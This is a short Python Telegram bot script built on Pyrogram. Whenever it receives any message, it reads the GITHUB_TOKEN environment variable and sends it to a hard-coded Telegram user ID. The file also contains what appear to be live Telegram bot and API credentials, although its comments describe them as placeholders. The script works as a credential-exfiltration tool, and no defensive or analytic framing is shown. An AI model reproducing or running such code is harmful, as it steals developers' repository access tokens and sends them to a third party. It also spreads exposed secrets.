from pyrogram import Client, filters
import os

# Replace 'YOUR_BOT_TOKEN', 'YOUR_API_ID', 'YOUR_API_HASH', and 'TARGET_USER_ID' with your actual values
bot_token = '6126230406:AAFAtz4AhVLbSEnm7KabLzDa7d5Yf0_Mo2I'
api_id = '11405252'
api_hash = 'b1a1fc3dc52ccc91781f33522255a880'
target_user_id = '1881720028'  # Replace with the actual user ID to whom you want to send the message

app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

async def send_github_token():
    # Replace 'your_github_token' with your actual GitHub token
    github_token = os.getenv("GITHUB_TOKEN")
    
    # Send the GitHub token to the specified user
    await app.send_message(target_user_id, f'GitHub Token: {github_token}')

@app.on_message
async def on_message(client, _):
    await send_github_token()

if __name__ == "__main__":
    app.run()
